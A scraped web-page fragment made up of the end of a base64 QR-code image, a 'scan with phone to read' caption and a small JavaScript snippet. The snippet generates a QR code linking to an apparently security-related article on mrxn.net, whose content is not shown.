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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-UploadComponentHandler-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 